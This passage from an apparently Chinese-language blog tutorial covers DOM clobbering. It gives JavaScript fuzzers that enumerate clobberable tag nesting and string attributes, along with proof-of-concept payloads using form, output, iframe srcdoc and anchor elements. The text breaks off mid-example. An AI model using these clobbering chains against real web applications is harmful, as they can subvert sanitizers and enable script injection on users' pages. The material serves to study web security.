nlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png" alt></p><h3 id="HTML-Relationships"><a href="#HTML-Relationships" class="headerlink" title="HTML Relationships"></a>HTML Relationships</h3><p>&#x518D;&#x8005;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; HTML &#x6807;&#x7B7E;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x7684;&#x5173;&#x7CFB;&#x6765;&#x6784;&#x5EFA;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> log=[];</span><br><span class="line"><span class="hljs-keyword">var</span> html = [<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;abbr&quot;</span>,<span class="hljs-string">&quot;acronym&quot;</span>,<span class="hljs-string">&quot;address&quot;</span>,<span class="hljs-string">&quot;applet&quot;</span>,<span class="hljs-string">&quot;area&quot;</span>,<span class="hljs-string">&quot;article&quot;</span>,<span class="hljs-string">&quot;aside&quot;</span>,<span class="hljs-string">&quot;audio&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;basefont&quot;</span>,<span class="hljs-string">&quot;bdi&quot;</span>,<span class="hljs-string">&quot;bdo&quot;</span>,<span class="hljs-string">&quot;bgsound&quot;</span>,<span class="hljs-string">&quot;big&quot;</span>,<span class="hljs-string">&quot;blink&quot;</span>,<span class="hljs-string">&quot;blockquote&quot;</span>,<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;br&quot;</span>,<span class="hljs-string">&quot;button&quot;</span>,<span class="hljs-string">&quot;canvas&quot;</span>,<span class="hljs-string">&quot;caption&quot;</span>,<span class="hljs-string">&quot;center&quot;</span>,<span class="hljs-string">&quot;cite&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;col&quot;</span>,<span class="hljs-string">&quot;colgroup&quot;</span>,<span class="hljs-string">&quot;command&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;datalist&quot;</span>,<span class="hljs-string">&quot;dd&quot;</span>,<span class="hljs-string">&quot;del&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>,<span class="hljs-string">&quot;dfn&quot;</span>,<span class="hljs-string">&quot;dialog&quot;</span>,<span class="hljs-string">&quot;dir&quot;</span>,<span class="hljs-string">&quot;div&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;dt&quot;</span>,<span class="hljs-string">&quot;element&quot;</span>,<span class="hljs-string">&quot;em&quot;</span>,<span class="hljs-string">&quot;embed&quot;</span>,<span class="hljs-string">&quot;fieldset&quot;</span>,<span class="hljs-string">&quot;figcaption&quot;</span>,<span class="hljs-string">&quot;figure&quot;</span>,<span class="hljs-string">&quot;font&quot;</span>,<span class="hljs-string">&quot;footer&quot;</span>,<span class="hljs-string">&quot;form&quot;</span>,<span class="hljs-string">&quot;frame&quot;</span>,<span class="hljs-string">&quot;frameset&quot;</span>,<span class="hljs-string">&quot;h1&quot;</span>,<span class="hljs-string">&quot;head&quot;</span>,<span class="hljs-string">&quot;header&quot;</span>,<span class="hljs-string">&quot;hgroup&quot;</span>,<span class="hljs-string">&quot;hr&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;iframe&quot;</span>,<span class="hljs-string">&quot;image&quot;</span>,<span class="hljs-string">&quot;img&quot;</span>,<span class="hljs-string">&quot;input&quot;</span>,<span class="hljs-string">&quot;ins&quot;</span>,<span class="hljs-string">&quot;isindex&quot;</span>,<span class="hljs-string">&quot;kbd&quot;</span>,<span class="hljs-string">&quot;keygen&quot;</span>,<span class="hljs-string">&quot;label&quot;</span>,<span class="hljs-string">&quot;legend&quot;</span>,<span class="hljs-string">&quot;li&quot;</span>,<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-string">&quot;listing&quot;</span>,<span class="hljs-string">&quot;main&quot;</span>,<span class="hljs-string">&quot;map&quot;</span>,<span class="hljs-string">&quot;mark&quot;</span>,<span class="hljs-string">&quot;marquee&quot;</span>,<span class="hljs-string">&quot;menu&quot;</span>,<span class="hljs-string">&quot;menuitem&quot;</span>,<span class="hljs-string">&quot;meta&quot;</span>,<span class="hljs-string">&quot;meter&quot;</span>,<span class="hljs-string">&quot;multicol&quot;</span>,<span class="hljs-string">&quot;nav&quot;</span>,<span class="hljs-string">&quot;nextid&quot;</span>,<span class="hljs-string">&quot;nobr&quot;</span>,<span class="hljs-string">&quot;noembed&quot;</span>,<span class="hljs-string">&quot;noframes&quot;</span>,<span class="hljs-string">&quot;noscript&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;ol&quot;</span>,<span class="hljs-string">&quot;optgroup&quot;</span>,<span class="hljs-string">&quot;option&quot;</span>,<span class="hljs-string">&quot;output&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;param&quot;</span>,<span class="hljs-string">&quot;picture&quot;</span>,<span class="hljs-string">&quot;plaintext&quot;</span>,<span class="hljs-string">&quot;pre&quot;</span>,<span class="hljs-string">&quot;progress&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>,<span class="hljs-string">&quot;rp&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-string">&quot;rtc&quot;</span>,<span class="hljs-string">&quot;ruby&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;samp&quot;</span>,<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;section&quot;</span>,<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;shadow&quot;</span>,<span class="hljs-string">&quot;slot&quot;</span>,<span class="hljs-string">&quot;small&quot;</span>,<span class="hljs-string">&quot;source&quot;</span>,<span class="hljs-string">&quot;spacer&quot;</span>,<span class="hljs-string">&quot;span&quot;</span>,<span class="hljs-string">&quot;strike&quot;</span>,<span class="hljs-string">&quot;strong&quot;</span>,<span class="hljs-string">&quot;style&quot;</span>,<span class="hljs-string">&quot;sub&quot;</span>,<span class="hljs-string">&quot;summary&quot;</span>,<span class="hljs-string">&quot;sup&quot;</span>,<span class="hljs-string">&quot;svg&quot;</span>,<span class="hljs-string">&quot;table&quot;</span>,<span class="hljs-string">&quot;tbody&quot;</span>,<span class="hljs-string">&quot;td&quot;</span>,<span class="hljs-string">&quot;template&quot;</span>,<span class="hljs-string">&quot;textarea&quot;</span>,<span class="hljs-string">&quot;tfoot&quot;</span>,<span class="hljs-string">&quot;th&quot;</span>,<span class="hljs-string">&quot;thead&quot;</span>,<span class="hljs-string">&quot;time&quot;</span>,<span class="hljs-string">&quot;title&quot;</span>,<span class="hljs-string">&quot;tr&quot;</span>,<span class="hljs-string">&quot;track&quot;</span>,<span class="hljs-string">&quot;tt&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;ul&quot;</span>,<span class="hljs-string">&quot;var&quot;</span>,<span class="hljs-string">&quot;video&quot;</span>,<span class="hljs-string">&quot;wbr&quot;</span>,<span class="hljs-string">&quot;xmp&quot;</span>], logs = [];</span><br><span class="line">div=<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;div&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;html.length;i++) {</span><br><span class="line">  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;html.length;j++) {</span><br><span class="line">    div.innerHTML=<span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=element1&gt;&apos;</span>+<span class="hljs-string">&apos;&lt;&apos;</span>+html[j]+<span class="hljs-string">&apos; id=element2&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">window</span>.element1 &amp;&amp; element1.element2){</span><br><span class="line">       log.push(html[i]+<span class="hljs-string">&apos;,&apos;</span>+html[j]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log.join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x4E86;&#x73B0;&#x5728; HTML5 &#x57FA;&#x672C;&#x4E0A;&#x6240;&#x6709;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F7F;&#x7528;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x8FDB;&#x884C; fuzz &#xFF0C;&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x53EA;&#x4F7F;&#x7528;&#x4E86;<code>id</code>&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x4F7F;&#x7528;<code>name</code>&#xFF0C;&#x9047;&#x4E0A;&#x6587;&#x7684;<code>HTMLCollection</code>&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7684;&#x662F;&#x4EE5;&#x4E0B;&#x5173;&#x7CFB;&#xFF1A;</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>button</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>fieldset</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>image</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>img</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>input</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>object</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>output</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>select</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>textarea</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x6784;&#x5EFA;<code>x.y</code>&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x6784;&#x5EFA;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(x.y.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Three-Level"><a href="#Three-Level" class="headerlink" title="Three Level"></a>Three Level</h3><p>&#x4E09;&#x7EA7;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;&#x4EE5;&#x4E0A;&#x4E24;&#x79CD;&#x6280;&#x5DE7;&#x6765;&#x6784;&#x5EFA;&#x4E86;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;y&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">z</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y.z.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5148;&#x7528;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#x83B7;&#x53D6;&#x7B2C;&#x4E8C;&#x7EA7;&#xFF0C;&#x518D;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x8868;&#x5355;&#x4E2D;&#x7528;<code>output</code>&#x6807;&#x7B7E;&#x5373;&#x53EF;&#x3002;</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>&#x4E09;&#x5C42;&#x5C42;&#x7EA7;&#x4EE5;&#x4E0A;&#x7684;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;<code>iframe</code>&#x4E0E;<code>srcdoc</code>&#x6765;&#x8FDB;&#x884C;&#x914D;&#x5408;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript">setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>alert(a.b.c.d),<span class="hljs-number">500</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x6240;&#x6709;&#x7684;<code>iframe</code>&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x6211;&#x4EEC;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x8FD9;&#x4E2A;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x7528;&#x5230;&#x5EF6;&#x65F6;&#xFF0C;&#x4E0D;&#x7528;&#x5EF6;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x6765;&#x8FDB;&#x884C;&#x5EF6;&#x7F13;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> <span class="hljs-string">&apos;http://example.com&apos;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(a.b.c.d)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Custom"><a href="#Custom" class="headerlink" title="Custom"></a>Custom</h3><p>&#x4EE5;&#x4E0A;&#x6211;&#x4EEC;&#x90FD;&#x662F;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x6765;&#x5229;&#x7528;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x80FD;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x5C5E;&#x6027;&#x6765;&#x6784;&#x9020;&#x5462;&#xFF1F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">y</span>=<span class="hljs-string">123</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.y)<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4EFB;&#x4F55;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#x5C5E;&#x6027;&#x90FD;&#x4E0D;&#x4F1A;&#x5177;&#x6709; DOM &#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x8FD4;&#x56DE;&#x4E86; <code>undefined</code></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B; fuzz &#x6240;&#x6709;&#x6807;&#x7B7E;&#x7684;&#x6709;&#x6CA1;&#x6709;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#x53EF;&#x4F9B;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">   <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">      <span class="hljs-keyword">try</span> {</span><br><span class="line">        props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">      }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x6807;&#x7B7E;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F8B;&#x5982;:</p><p></p><figure class="highlight avrasm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">a:</span>username</span><br><span class="line"><span class="hljs-symbol">a:</span>password</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x8FD9;&#x4EC5;&#x4EC5;&#x5F97;&#x5230;&#x7684;&#x53EA;&#x662F;&#x77E5;&#x9053;&#x5B83;&#x4EEC;&#x5C5E;&#x6027;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;&#x80FD;&#x4E0D;&#x80FD;&#x5229;&#x7528;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#x6765;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">  <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">   <span class="hljs-keyword">try</span> {</span><br><span class="line">    DOM.innerHTML = <span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=x &apos;</span>+prop+<span class="hljs-string">&apos;=1&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>)[prop] == <span class="hljs-number">1</span>) {</span><br><span class="line">       props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">    }</span><br><span class="line">    }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">  }</span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x6807;&#x7B7E;&#x4EE5;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#x540D;&#x79F0;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5176;&#x4E2D;&#x7684;<code>a:title</code>&#x6765;&#x8FDB;&#x884C;&#x7EC4;&#x5408;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&apos;hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(x.title);<span class="hljs-comment">//hasaki</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x5728;&#x6211;&#x4EEC;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5C5E;&#x6027;&#x4E2D;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F; a &#x6807;&#x7B7E;&#x7684;<code>username</code>&#x8DDF;<code>password</code>&#x5C5E;&#x6027;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x901A;&#x8FC7;<code>title</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5229;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>href</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5229;&#x7528;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 